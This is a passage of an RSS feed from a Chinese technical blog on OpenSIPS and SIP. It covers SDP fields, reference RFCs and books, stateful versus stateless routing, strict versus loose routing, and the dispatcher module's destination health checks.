          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;-V&lt;/td&gt;
          &lt;td&gt;输出rtpproxy的版本&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.rtpproxy.org/&#34;&gt;https://www.rtpproxy.org/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.rtpproxy.org/doc/master/user_manual.html&#34;&gt;https://www.rtpproxy.org/doc/master/user_manual.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/sippy/rtpproxy&#34;&gt;https://github.com/sippy/rtpproxy&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>sdp协议简介</title>
      <link>https://wdd.js.org/opensips/ch9/sdp/</link>
      <pubDate>Thu, 20 Jun 2019 15:29:36 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch9/sdp/</guid>
      <description>&lt;h1 id=&#34;sdp栗子&#34;&gt;sdp栗子&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;v&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;o&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;- &lt;span style=&#34;color:#ae81ff&#34;&gt;7158718066157017333&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; IN IP4 127.0.0.1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;-
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;t&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;group:BUNDLE &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;msid-semantic: WMS byn72RFJBCUzdSPhnaBU4vSz7LFwfwNaF2Sy
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;m&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;audio &lt;span style=&#34;color:#ae81ff&#34;&gt;64030&lt;/span&gt; UDP/TLS/RTP/SAVPF &lt;span style=&#34;color:#ae81ff&#34;&gt;111&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;103&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;104&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;106&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;105&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;110&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;112&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;113&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;126&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;c&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;IN IP4 192.168.2.180
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;session描述&#34;&gt;Session描述&lt;/h1&gt;
&lt;p&gt;**&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;v&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;protocol version number, currently only 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;o&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;originator and session identifier : username, id, version number, network address&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;session name : mandatory with at least one UTF-8-encoded character&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;i&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;* &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;session title or short information&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;u&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;* &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;URI of description&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;e&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;* &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;zero or more email address with optional name of contacts&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;* &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;zero or more phone number with optional name of contacts&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;c&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;* &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;connection information—not required &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; included in all media&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;b&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;* &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;zero or more bandwidth information lines&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;One or more Time descriptions &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;t=&amp;#34;&lt;/span&gt; and &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r=&amp;#34;&lt;/span&gt; lines; see below&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;z&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;* &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;time zone adjustments&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;k&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;* &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;encryption key&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;* &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;zero or more session attribute lines&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Zero or more Media descriptions &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;each one starting by an &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m=&amp;#34;&lt;/span&gt; line; see below&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;时间描述必须&#34;&gt;时间描述(必须)&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;t&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;time the session is active&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;r&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;* &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;zero or more repeat times&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;媒体描述可选&#34;&gt;媒体描述(可选)&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;m&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;media name and transport address&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;i&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;* &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;media title or information field&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;c&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;* &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;connection information — optional &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; included at session level&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;b&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;* &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;zero or more bandwidth information lines&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;k&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;* &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;encryption key&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;* &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;zero or more media attribute lines — overriding the Session attribute lines&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>参考资料与书籍</title>
      <link>https://wdd.js.org/opensips/ch9/books/</link>
      <pubDate>Thu, 20 Jun 2019 10:59:17 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch9/books/</guid>
      <description>&lt;ul&gt;
&lt;li&gt;Building Telephony Systems with OpenSIPS  Second Edition&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc3261&#34;&gt;SIP: Session Initiation Protocol&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc3665&#34;&gt;Session Initiation Protocol (SIP) Basic Call Flow Examples&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc6141&#34;&gt;Re-INVITE and Target-Refresh Request Handling in the Session Initiation Protocol (SIP) &lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc4566&#34;&gt;SDP: Session Description Protocol&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;freeswitch权威指南&lt;/li&gt;
&lt;li&gt;SIP: Understanding the Session Initiation Protocol, Third Edition (Artech House Telecommunications)&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc4028&#34;&gt;https://tools.ietf.org/html/rfc4028&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Hacking VoIP: Protocols, Attacks, and Countermeasures&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>有状态和无状态路由</title>
      <link>https://wdd.js.org/opensips/ch5/stateful-stateless/</link>
      <pubDate>Wed, 19 Jun 2019 23:40:08 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch5/stateful-stateless/</guid>
      <description>&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;操作&lt;/th&gt;
          &lt;th&gt;无状态&lt;/th&gt;
          &lt;th&gt;有状态&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;SIP forward&lt;/td&gt;
          &lt;td&gt;forward()&lt;/td&gt;
          &lt;td&gt;t_relay()&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;SIP replying&lt;/td&gt;
          &lt;td&gt;sl_send_reply()&lt;/td&gt;
          &lt;td&gt;t_reply()&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Create transaction&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;t_newtran()&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Match transcation&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;t_check_trans()&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;</description>
    </item>
    <item>
      <title>严格路由和松散路由</title>
      <link>https://wdd.js.org/opensips/ch5/strict-loose-routing/</link>
      <pubDate>Tue, 18 Jun 2019 11:11:12 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch5/strict-loose-routing/</guid>
      <description>&lt;p&gt;松散路由是sip 2版本的新的路由方法。严格路由是老的路由方法。&lt;/p&gt;
&lt;h1 id=&#34;如何从sip消息中区分严格路由和松散路由&#34;&gt;如何从sip消息中区分严格路由和松散路由&lt;/h1&gt;
&lt;p&gt;下图sip消息中Route字段中带有**lr,  **则说明这是松散路由。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;REGISTER sip:127.0.0.1 SIP/2.0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Via: SIP/2.0/UDP 127.0.0.1:58979;rport;branch&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;z9hG4bKPjMRzNdeTKn9rHNDtyJuVoyrDb84.cPtL8
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Route: &amp;lt;sip:127.0.0.1;lr&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Max-Forwards: &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;From: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1001&amp;#34;&lt;/span&gt; &amp;lt;sip:1001@172.17.0.2&amp;gt;;tag&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;oqkOzbQYd9cx5vXFjUnB1WufgWUZZxtZ
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;To: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1001&amp;#34;&lt;/span&gt; &amp;lt;sip:1001@172.17.0.2&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;功能上的区别&#34;&gt;功能上的区别&lt;/h1&gt;
&lt;p&gt;严格路由，sip请求经过uas后，invite url每次都会被重写。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch5/strict-loose-routing/2022-12-01-21-39-52.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;松散路由，sip请求经过uas后，invite url不变。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch5/strict-loose-routing/2022-12-01-21-40-00.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch5/strict-loose-routing/2022-12-01-21-40-43.png&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#1 invite&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INVITE sip:callee@domain.com SIP/2.0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Contact: sip:caller@u1.example.com
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#2 invite&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INVITE sip:callee@domain.com SIP/2.0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Contact: sip:caller@u1.example.com
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Record-Route: &amp;lt;sip:p1.example.com;lr&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#3 invite&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;INVITE sip:callee@u2.domain.com SIP/2.0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Contact: sip:caller@u1.example.com
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Record-Route: &amp;lt;sip:p2.domain.com;lr&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Record-Route: &amp;lt;sip:p1.example.com;lr&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#4 200 ok&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SIP/2.0 &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; OK
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Contact: sip:callee@u2.domain.com
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Record-Route: &amp;lt;sip:p2.domain.com;lr&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Record-Route: &amp;lt;sip:p1.example.com;lr&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#7 bye&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;BYE sip:callee@u2.domain.com SIP/2.0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Route: &amp;lt;sip:p1.example.com;lr&amp;gt;,&amp;lt;sip:p2.domain.com;lr&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#8 bye&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;BYE sip:callee@u2.domain.com SIP/2.0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Route: &amp;lt;sip:p2.domain.com;lr&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#9 bye&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;BYE sip:callee@u2.domain.com SIP/2.0
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;traversing-a-strict-routing-proxy&#34;&gt;Traversing a Strict-Routing Proxy&lt;/h1&gt;</description>
    </item>
    <item>
      <title>sip消息分发之dispatcher模块</title>
      <link>https://wdd.js.org/opensips/ch6/dispatcher/</link>
      <pubDate>Tue, 18 Jun 2019 10:51:15 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch6/dispatcher/</guid>
      <description>&lt;p&gt;dispatcher模块用来分发sip消息。&lt;/p&gt;
&lt;h1 id=&#34;dispatcher如何记录目的地状态&#34;&gt;dispatcher如何记录目的地状态&lt;/h1&gt;
&lt;p&gt;dispatcher会使用一张表。&lt;/p&gt;
&lt;p&gt;需要关注两个字段destionations， state。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;destionations表示sip消息要发往的目的地&lt;/li&gt;
&lt;li&gt;state表示对目的地的状态检测结果
&lt;ul&gt;
&lt;li&gt;0 可用&lt;/li&gt;
&lt;li&gt;1 不可用&lt;/li&gt;
&lt;li&gt;2 表示正在检测&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;opensips只会想可用的目的地转发sip消息&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;id&lt;/th&gt;
          &lt;th&gt;setid&lt;/th&gt;
          &lt;th&gt;destionations&lt;/th&gt;
          &lt;th&gt;state&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;sip:p1:5060&lt;/td&gt;
          &lt;td&gt;0&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;2&lt;/td&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;sip:p2:5060&lt;/td&gt;
          &lt;td&gt;1&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;3&lt;/td&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;sip:p2:5061&lt;/td&gt;
          &lt;td&gt;2&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;dispatcher如何检测目的地的状态&#34;&gt;dispatcher如何检测目的地的状态&lt;/h1&gt;
&lt;p&gt;本地的opensips会周期性的向目的地发送options包，如果对方立即返回200ok, 就说明目的地可用。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn.nlark.com/yuque/__puml/98cd369b3c409e98c2ca3487fb756659.svg#lake_card_v2=eyJjb2RlIjoiQHN0YXJ0dW1sXG5sb2NhbGhvc3QgLT4gcDE6IE9QVElPTiByZXF1ZXN0XG5wMSAtLT4gbG9jYWxob3N0OiAyMDAgb2tcbkBlbmR1bWwiLCJ1cmwiOiJodHRwczovL2Nkbi5ubGFyay5jb20veXVxdWUvX19wdW1sLzk4Y2QzNjliM2M0MDllOThjMmNhMzQ4N2ZiNzU2NjU5LnN2ZyIsInR5cGUiOiJwdW1sIiwiaWQiOiI1ckl1SyIsImNhcmQiOiJkaWFncmFtIn0=&#34;&gt;
在达到一定阈值后，目的地一直无响应，则opensips将其设置为不可用状态，或者正在检测状态。如下图所示&lt;/p&gt;
